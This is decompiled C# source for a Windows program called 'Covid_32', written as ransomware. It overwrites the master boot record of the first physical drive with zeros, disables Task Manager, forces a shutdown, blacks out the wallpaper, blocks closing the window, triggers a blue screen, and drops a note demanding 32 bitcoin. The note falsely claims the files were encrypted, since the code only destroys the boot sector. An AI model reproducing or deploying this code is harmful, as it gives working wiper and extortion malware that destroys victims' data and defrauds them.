﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Covid_32
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : Form
	{
		// Token: 0x06000006 RID: 6
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000007 RID: 7
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

		// Token: 0x06000008 RID: 8
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x06000009 RID: 9
		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

		// Token: 0x0600000A RID: 10 RVA: 0x000020A4 File Offset: 0x000002A4
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000020BC File Offset: 0x000002BC
		private void button1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Error: Your Payment was Not Approved. Try Again. also pay with the address so we restore your MBR AND YOUR DATABASE.", "Payment Checker Decryptor", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			MessageBox.Show("if you dont have bitcoins and you dont know how to pay then go to: https://www.coinbase.com/", "Bitcoin helper", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000020E8 File Offset: 0x000002E8
		private void timer1_Tick(object sender, EventArgs e)
		{
			IntPtr intPtr = Form1.CreateFile("\\\\.\\PhysicalDrive0", 1073741824U, 0U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			bool flag = intPtr != IntPtr.Zero;
			if (flag)
			{
				byte[] array = new byte[512];
				uint num;
				bool flag2 = Form1.WriteFile(intPtr, array, (uint)array.Length, out num, IntPtr.Zero);
				if (flag2)
				{
					Process.Start("shutdown.exe", "/s /t 300 /c \"5 mins to pay or else you will lose all your data and also your MBR.\"");
					RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
				}
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000217D File Offset: 0x0000037D
		private void Form1_Load(object sender, EventArgs e)
		{
			this.timer1.Start();
			this.timer2.Start();
			this.timer3.Start();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000021A4 File Offset: 0x000003A4
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000021A8 File Offset: 0x000003A8
		private void timer2_Tick(object sender, EventArgs e)
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			using (Bitmap bitmap = new Bitmap(width, height))
			{
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.Clear(Color.Black);
					string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "black_wallpaper.bmp");
					bitmap.Save(text, ImageFormat.Bmp);
					Form1.SystemParametersInfo(20, 0, text, 3);
				}
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002260 File Offset: 0x00000460
		private void button2_Click(object sender, EventArgs e)
		{
			MessageBox.Show("you sure you wanna do that???", "WHY DO YOU WANT TO DESTROY THE FUCKING PC???", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			BSOD.CauseNtHardError();
			BSOD.RaisePrivilege();
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002282 File Offset: 0x00000482
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
			MessageBox.Show("Error: Cannot Close Because you must pay to close and restore your data.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000022A0 File Offset: 0x000004A0
		private void timer3_Tick(object sender, EventArgs e)
		{
			string path = Path.Combine(Application.StartupPath, "READMEWHATYOUDID.txt");
			File.WriteAllText(path, "ALL YOUR DATA WERE ENCRYPTED AND NOW YOUR THE VICTIM OF COVID-32 RANSOMWARE. only way to get your data back is to pay 32 BTC IN THE ADDRESS BELOW. AFTER THAT YOU NEED TO CHECK PAYMENT YOU GET A SPECIAL KEY TO UNLOCK YOUR PC. you only have 5 mins. when the time its up your pc will be destroyed. and do not reboot your computer or else you lose data and will not boot up again.");
		}

		// Token: 0x04000001 RID: 1
		private const uint GENERIC_WRITE = 1073741824U;

		// Token: 0x04000002 RID: 2
		private const uint OPEN_EXISTING = 3U;

		// Token: 0x04000003 RID: 3
		private const int SPI_SETDESKWALLPAPER = 20;

		// Token: 0x04000004 RID: 4
		private const int SPIF_UPDATEINIFILE = 1;

		// Token: 0x04000005 RID: 5
		private const int SPIF_SENDCHANGE = 2;
	}
}
